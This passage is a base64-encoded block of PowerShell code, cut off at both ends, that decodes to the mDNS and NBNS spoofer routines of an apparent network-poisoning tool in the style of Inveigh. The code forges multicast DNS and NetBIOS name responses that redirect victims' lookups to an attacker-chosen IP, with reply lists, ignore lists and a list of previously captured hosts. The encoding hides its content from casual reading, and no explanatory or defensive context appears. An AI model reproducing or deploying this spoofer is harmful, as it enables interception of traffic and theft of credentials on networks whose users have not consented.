ja2V0LCRtRE5TX3Jlc3BvbnNlX3BhY2tldC5MZW5ndGgpCiAgICAgICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgICAgICRtRE5TX1VEUF9jbGllbnQgPSBuZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5VZHBDbGllbnQgNTM1MwogICAgICAgICAgICAgICAgJG1ETlNfbXVsdGljYXN0X2dyb3VwID0gW0lQQWRkcmVzc10iMjI0LjAuMC4yNTEiCiAgICAgICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LkpvaW5NdWx0aWNhc3RHcm91cCgkbUROU19tdWx0aWNhc3RfZ3JvdXApCiAgICAgICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LkNsaWVudC5SZWNlaXZlVGltZW91dCA9IDUwMDAKICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSByZXNwb25zZSBzZW50IgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIGlmKCRJbnNwZWN0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBpbnNwZWN0IG9ubHkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJG1ETlNUeXBlcyAtbm90Y29udGFpbnMgJ1FVJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gZGlzYWJsZWQgbUROUyB0eXBlIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySG9zdHNSZXBseSAtYW5kICRTcG9vZmVySG9zdHNSZXBseSAtbm90Y29udGFpbnMgJG1ETlNfcXVlcnlfc3RyaW5nKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkbUROU19xdWVyeV9zdHJpbmcgaXMgbm90IG9uIHJlcGx5IGxpc3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJIb3N0c0lnbm9yZSAtYW5kICRTcG9vZmVySG9zdHNJZ25vcmUgLWNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJG1ETlNfcXVlcnlfc3RyaW5nIGlzIG9uIGlnbm9yZSBsaXN0IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySVBzUmVwbHkgLWFuZCAkU3Bvb2ZlcklQc1JlcGx5IC1ub3Rjb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkc291cmNlX0lQIGlzIG5vdCBvbiByZXBseSBsaXN0IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySVBzSWdub3JlIC1hbmQgJFNwb29mZXJJUHNJZ25vcmUgLWNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRzb3VyY2VfSVAgaXMgb24gaWdub3JlIGxpc3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJGludmVpZ2guSVBfY2FwdHVyZV9saXN0IC1jb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBwcmV2aW91cyBjYXB0dXJlIGZyb20gJHNvdXJjZV9JUCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gc29tZXRoaW5nIHdlbnQgd3JvbmciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgaWYoJG1ETlNfcmVxdWVzdF9kYXRhKSAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gbUROUyhRVSkgcmVxdWVzdCBmb3IgJG1ETlNfcXVlcnlfc3RyaW5nX2Z1bGwgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UiKQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBtRE5TKFFVKSByZXF1ZXN0IGZvciAkbUROU19xdWVyeV9zdHJpbmdfZnVsbCByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIG1ETlMoUVUpIHJlcXVlc3QgZm9yICRtRE5TX3F1ZXJ5X3N0cmluZ19mdWxsIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkbUROU19yZXNwb25zZV9tZXNzYWdlIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRtRE5TX3JlcXVlc3RfZGF0YSA9ICIiCiAgICAgICAgfQogICAgICAgIGVsc2VpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRtRE5TX3JlcXVlc3RfZGF0YSkgLWxpa2UgJyotMDUtNkMtNkYtNjMtNjEtNkMtMDAtMDAtMDEtMDAtMDEtKicpCiAgICAgICAgewogICAgICAgICAgICAkbUROU19yZXNwb25zZV9wYWNrZXQgPSAkbUROU19yZXF1ZXN0X2RhdGFbMCwxXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODQsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXF1ZXN0X2RhdGFbMTIuLigkbUROU19yZXF1ZXN0X2RhdGFbMTJdICsgMTIpXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDUsMHg2YywweDZmLDB4NjMsMHg2MSwweDZjLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDEsMHgwMCwweDAxICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfVFRMX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDA0ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc11bU3RyaW5nXShbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJFNwb29mZXJJUCkpLkdldEFkZHJlc3NCeXRlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAkbUROU19xdWVyeV9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgMTMgJG1ETlNfcmVxdWVzdF9kYXRhWzEyXSAkbUROU19yZXF1ZXN0X2RhdGEKICAgICAgICAgICAgJG1ETlNfcXVlcnlfc3RyaW5nX2Z1bGwgPSAkbUROU19xdWVyeV9zdHJpbmcgKyAiLmxvY2FsIiAgIAogICAgICAgICAgICAkc291cmNlX0lQID0gJG1ETlNfbGlzdGVuZXJfZW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCEkSW5zcGVjdCAtYW5kICgkbUROU19yZXF1ZXN0X2RhdGEgLWFuZCAkbUROU19saXN0ZW5lcl9lbmRwb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nIC1uZSAnMC4wLjAuMCcpIC1hbmQgKCEkU3Bvb2Zlckhvc3RzUmVwbHkgLW9yICRTcG9vZmVySG9zdHNSZXBseSAtY29udGFpbnMgJG1ETlNfcXVlcnlfc3RyaW5nKSAtYW5kICgKICAgICAgICAgICAgISRTcG9vZmVySG9zdHNJZ25vcmUgLW9yICRTcG9vZmVySG9zdHNJZ25vcmUgLW5vdGNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykgLWFuZCAoISRTcG9vZmVySVBzUmVwbHkgLW9yICRTcG9vZmVySVBzUmVwbHkgLWNvbnRhaW5zICRzb3VyY2VfSVApIC1hbmQgKCEkU3Bvb2ZlcklQc0lnbm9yZSAtb3IgJFNwb29mZXJJUHNJZ25vcmUgLW5vdGNvbnRhaW5zICRzb3VyY2VfSVApIC1hbmQgKAogICAgICAgICAgICAkbUROU1R5cGVzIC1jb250YWlucyAnUU0nKSAtYW5kICgkaW52ZWlnaC5zcG9vZmVyX3JlcGVhdCAtb3IgJGludmVpZ2guSVBfY2FwdHVyZV9saXN0IC1ub3Rjb250YWlucyAkc291cmNlX0lQKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJG1ETlNfZGVzdGluYXRpb25fZW5kcG9pbnQgPSBOZXctT2JqZWN0IE5ldC5JUEVuZHBvaW50KFtJUEFkZHJlc3NdIjIyNC4wLjAuMjUxIiw1MzUzKQogICAgICAgICAgICAgICAgJG1ETlNfVURQX2NsaWVudC5Db25uZWN0KCRtRE5TX2Rlc3RpbmF0aW9uX2VuZHBvaW50KQogICAgICAgICAgICAgICAgJG1ETlNfVURQX2NsaWVudC5TZW5kKCRtRE5TX3Jlc3BvbnNlX3BhY2tldCwkbUROU19yZXNwb25zZV9wYWNrZXQuTGVuZ3RoKQogICAgICAgICAgICAgICAgJG1ETlNfVURQX2NsaWVudC5DbG9zZSgpCiAgICAgICAgICAgICAgICAkbUROU19VRFBfY2xpZW50ID0gbmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50IDUzNTMKICAgICAgICAgICAgICAgICRtRE5TX211bHRpY2FzdF9ncm91cCA9IFtJUEFkZHJlc3NdIjIyNC4wLjAuMjUxIgogICAgICAgICAgICAgICAgJG1ETlNfVURQX2NsaWVudC5Kb2luTXVsdGljYXN0R3JvdXAoJG1ETlNfbXVsdGljYXN0X2dyb3VwKQogICAgICAgICAgICAgICAgJG1ETlNfVURQX2NsaWVudC5DbGllbnQuUmVjZWl2ZVRpbWVvdXQgPSA1MDAwCiAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gcmVzcG9uc2Ugc2VudCIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkSW5zcGVjdCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gaW5zcGVjdCBvbmx5IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRtRE5TVHlwZXMgLW5vdGNvbnRhaW5zICdRTScpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIGRpc2FibGVkIG1ETlMgdHlwZSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2Zlckhvc3RzUmVwbHkgLWFuZCAkU3Bvb2Zlckhvc3RzUmVwbHkgLW5vdGNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJG1ETlNfcXVlcnlfc3RyaW5nIGlzIG5vdCBvbiByZXBseSBsaXN0IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySG9zdHNJZ25vcmUgLWFuZCAkU3Bvb2Zlckhvc3RzSWdub3JlIC1jb250YWlucyAkbUROU19xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRtRE5TX3F1ZXJ5X3N0cmluZyBpcyBvbiBpZ25vcmUgbGlzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2ZlcklQc1JlcGx5IC1hbmQgJFNwb29mZXJJUHNSZXBseSAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2ZlcklQc0lnbm9yZSAtYW5kICRTcG9vZmVySVBzSWdub3JlIC1jb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkc291cmNlX0lQIGlzIG9uIGlnbm9yZSBsaXN0IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtY29udGFpbnMgJHNvdXJjZV9JUCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gcHJldmlvdXMgY2FwdHVyZSBmcm9tICRzb3VyY2VfSVAiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHNvbWV0aGluZyB3ZW50IHdyb25nIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJG1ETlNfcmVxdWVzdF9kYXRhKSAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gbUROUyhRTSkgcmVxdWVzdCBmb3IgJG1ETlNfcXVlcnlfc3RyaW5nX2Z1bGwgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UiKQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBtRE5TKFFNKSByZXF1ZXN0IGZvciAkbUROU19xdWVyeV9zdHJpbmdfZnVsbCByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIG1ETlMoUU0pIHJlcXVlc3QgZm9yICRtRE5TX3F1ZXJ5X3N0cmluZ19mdWxsIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkbUROU19yZXNwb25zZV9tZXNzYWdlIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRtRE5TX3JlcXVlc3RfZGF0YSA9ICIiCiAgICAgICAgfQoKICAgIH0KCiAgICAkbUROU19VRFBfY2xpZW50LkNsb3NlKCkKIH0KCiMgVW5wcml2aWxlZ2VkIE5CTlMgU3Bvb2ZlciBTY3JpcHRCbG9jawokTkJOU19zcG9vZmVyX3NjcmlwdGJsb2NrID0gCnsKICAgIHBhcmFtICgkSW5zcGVjdCwkTkJOU19yZXNwb25zZV9tZXNzYWdlLCRTcG9vZmVySVAsJE5CTlNUeXBlcywkU3Bvb2Zlckhvc3RzUmVwbHksJFNwb29mZXJIb3N0c0lnbm9yZSwkU3Bvb2ZlcklQc1JlcGx5LCRTcG9vZmVySVBzSWdub3JlLCROQk5TVFRMKQoKICAgICROQk5TX3J1bm5pbmcgPSAkdHJ1ZQogICAgJE5CTlNfbGlzdGVuZXJfZW5kcG9pbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCAoW0lQQWRkcmVzc106OkJyb2FkY2FzdCwxMzcpCgogICAgdHJ5CiAgICB7CiAgICAgICAgJE5CTlNfVURQX2NsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVkcENsaWVudCAxMzcKICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgTkJOUyBzcG9vZmVyIikKICAgICAgICAkTkJOU19ydW5uaW5nID0gJGZhbHNlCgogICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEVycm9yIHN0YXJ0aW5nIE5CTlMgc3Bvb2ZlciIpCiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBFcnJvciBzdGFydGluZyBOQk5TIHNwb29mZXIiKQogICAgICAgIH0KCiAgICB9CgogICAgJE5CTlNfVURQX2NsaWVudC5DbGllbnQuUmVjZWl2ZVRpbWVvdXQgPSA1MDAwCiAgICAkTkJOU19UVExfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCROQk5TVFRMKQogICAgW0FycmF5XTo6UmV2ZXJzZSgkTkJOU19UVExfYnl0ZXMpCgogICAgd2hpbGUoJGludmVpZ2gucnVubmluZyAtYW5kICROQk5TX3J1bm5pbmcpCiAgICB7CiAgICAgICAgCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICAkTkJOU19yZXF1ZXN0X2RhdGEgPSAkTkJOU19VRFBfY2xpZW50LlJlY2VpdmUoW1JlZl0kTkJOU19saXN0ZW5lcl9lbmRwb2ludCkKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgICROQk5TX1VEUF9jbGllbnQuQ2xvc2UoKQogICAgICAgICAgICAkTkJOU19VRFBfY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50IDEzNwogICAgICAgICAgICAkTkJOU19VRFBfY2xpZW50LkNsaWVudC5SZWNlaXZlVGltZW91dCA9IDUwMDAKICAgICAgICB9CgogICAgICAgICRJUCA9IChUZXN0LUNvbm5lY3Rpb24gMTI3LjAuMC4xIC1jb3VudCAxIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSXB2NEFkZHJlc3MpCgogICAgICAgIGlmKCROQk5TX3JlcXVlc3RfZGF0YSAtYW5kIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJE5CTlNfcmVxdWVzdF9kYXRhWzEwLi4xMV0pIC1uZSAnMDAtMDEnKQogICAgICAgIHsKICAgICAgICAgICAgJE5CTlNfVFRMX2J5dGVzID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkTkJOU1RUTCkKICAgICAgICAgICAgW0FycmF5XTo6UmV2ZXJzZSgkTkJOU19UVExfYnl0ZXMpCgogICAgICAgICAgICAkTkJOU19yZXNwb25zZV9wYWNrZXQgPSAkTkJOU19yZXF1ZXN0X2RhdGFbMCwxXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgyMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3JlcXVlc3RfZGF0YVsxMy4uJE5CTlNfcmVxdWVzdF9kYXRhLkxlbmd0aF0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19UVExfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDYsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc11bU3RyaW5nXShbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJFNwb29mZXJJUCkpLkdldEFkZHJlc3NCeXRlcygpICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMAoKICAgICAgICAgICAgJHNvdXJjZV9JUCA9ICROQk5TX2xpc3RlbmVyX2VuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcKICAgICAgICAgICAgJE5CTlNfcXVlcnlfdHlwZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJE5CTlNfcmVxdWVzdF9kYXRhWzQzLi40NF0pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIHN3aXRjaCAoJE5CTlNfcXVlcnlfdHlwZSkKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICc0MS00MScKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjAwIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICc0MS00NCcKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjAzIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICc0My00MScKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjIwIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICc0Mi00QycKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjFCIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICc0Mi00RCcKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjFDIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICc0Mi00RScKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjFEIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICc0Mi00RicKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gIjFFIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE5CTlNfcXVlcnkgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCROQk5TX3JlcXVlc3RfZGF0YVsxMy4uKCROQk5TX3JlcXVlc3RfZGF0YS5MZW5ndGggLSA0KV0pCiAgICAgICAgICAgICROQk5TX3F1ZXJ5ID0gJE5CTlNfcXVlcnkgLXJlcGxhY2UgIi0wMCIsIiIKICAgICAgICAgICAgJE5CTlNfcXVlcnkgPSAkTkJOU19xdWVyeS5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICROQk5TX3F1ZXJ5X3N0cmluZ19lbmNvZGVkID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyaW5nICgkTkJOU19xdWVyeSwwLCROQk5TX3F1ZXJ5Lkxlbmd0aCkKICAgICAgICAgICAgJE5CTlNfcXVlcnlfc3RyaW5nX2VuY29kZWQgPSAkTkJOU19xdWVyeV9zdHJpbmdfZW5jb2RlZC5TdWJzdHJpbmcoMCwkTkJOU19xdWVyeV9zdHJpbmdfZW5jb2RlZC5JbmRleE9mKCJDQSIpKQogICAgICAgICAgICAkTkJOU19xdWVyeV9zdHJpbmdfc3VidHJhY3RlZCA9ICIiCiAgICAgICAgICAgICROQk5TX3F1ZXJ5X3N0cmluZyA9ICIiCiAgICAgICAgICAgICRuID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGRvCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICROQk5TX3F1ZXJ5X3N0cmluZ19zdWIgPSAoKFtCeXRlXVtDaGFyXSgkTkJOU19xdWVyeV9zdHJpbmdfZW5jb2RlZC5TdWJzdHJpbmcoJG4sMSkpKSAtIDY1KQogICAgICAgICAgICAgICAgJE5CTlNfcXVlcnlfc3RyaW5nX3N1YnRyYWN0ZWQgKz0gKFtTeXN0ZW0uQ29udmVydF06OlRvU3RyaW5nKCROQk5TX3F1ZXJ5X3N0cmluZ19zdWIsMTYpKQogICAgICAgICAgICAgICAgJG4gKz0gMQogICAgICAgICAgICB9CiAgICAgICAgICAgIHVudGlsKCRuIC1ndCAoJE5CTlNfcXVlcnlfc3RyaW5nX2VuY29kZWQuTGVuZ3RoIC0gMSkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICRuID0gMAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBkbwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV9zdHJpbmcgKz0gKFtDaGFyXShbU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCROQk5TX3F1ZXJ5X3N0cmluZ19zdWJ0cmFjdGVkLlN1YnN0cmluZygkbiwyKSwxNikpKQogICAgICAgICAgICAgICAgJG4gKz0gMgogICAgICAgICAgICB9CiAgICAgICAgICAgIHVudGlsKCRuIC1ndCAoJE5CTlNfcXVlcnlfc3RyaW5nX3N1YnRyYWN0ZWQuTGVuZ3RoIC0gMSkgLW9yICROQk5TX3F1ZXJ5X3N0cmluZy5MZW5ndGggLWVxIDE1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYoISRJbnNwZWN0IC1hbmQgKCROQk5TX3JlcXVlc3RfZGF0YSAtYW5kICROQk5TX2xpc3RlbmVyX2VuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgLW5lICcyNTUuMjU1LjI1NS4yNTUnKSAtYW5kICghJFNwb29mZXJIb3N0c1JlcGx5IC1vciAkU3Bvb2Zlckhvc3RzUmVwbHkgLWNvbnRhaW5zICROQk5TX3F1ZXJ5X3N0cmluZykgLWFuZCAoCiAgICAgICAgICAgICEkU3Bvb2Zlckhvc3RzSWdub3JlIC1vciAkU3Bvb2Zlckhvc3RzSWdub3JlIC1ub3Rjb250YWlucyAkTkJOU19xdWVyeV9zdHJpbmcpIC1hbmQgKCEkU3Bvb2ZlcklQc1JlcGx5IC1vciAkU3Bvb2ZlcklQc1JlcGx5IC1jb250YWlucyAkc291cmNlX0lQKSAtYW5kICghJFNwb29mZXJJUHNJZ25vcmUgLW9yICRTcG9vZmVySVBzSWdub3JlIC1ub3Rjb250YWlucyAkc291cmNlX0lQKSAtYW5kICgKICAgICAgICAgICAgJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQgLW9yICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoJE5CTlNUeXBlcyAtY29udGFpbnMgJE5CTlNfcXVlcnlfdHlwZSkgLWFuZCAoJHNvdXJjZV9JUCAtbmUgJElQKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE5CTlNfZGVzdGluYXRpb25fZW5kcG9pbnQgPSBOZXctT2J